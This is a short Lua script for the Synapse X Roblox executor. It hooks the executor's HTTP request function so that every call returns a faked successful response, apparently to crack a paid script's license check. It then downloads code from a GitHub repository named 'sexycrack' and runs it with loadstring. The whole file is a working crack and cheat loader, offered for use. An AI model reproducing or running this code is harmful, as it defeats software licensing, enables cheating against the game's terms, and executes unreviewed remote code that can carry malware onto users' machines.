local AttemptSet = pcall(function()
    setreadonly(syn,false)
end)
setreadonly(syn, false)

local b = syn.request

syn.request = function(t)

    warn("Spoofing Return Value...")

    return {StatusMessage = "GET", StatusCode = 200, Body = "f58d828d6cec026a6ee479e82df4bebec9b75ec1f60213b5b271d16f46a15be9f9f15cb0ba7765efd4a8b78b651ff1087c0ba8f981d2e384121f0b40fe35fb85", Cookies = {}, Headers = {}}
end
wait()
loadstring(game:HttpGet('https://raw.githubusercontent.com/tututu1mn13/sexycrack/main/trashhh.lua'))()
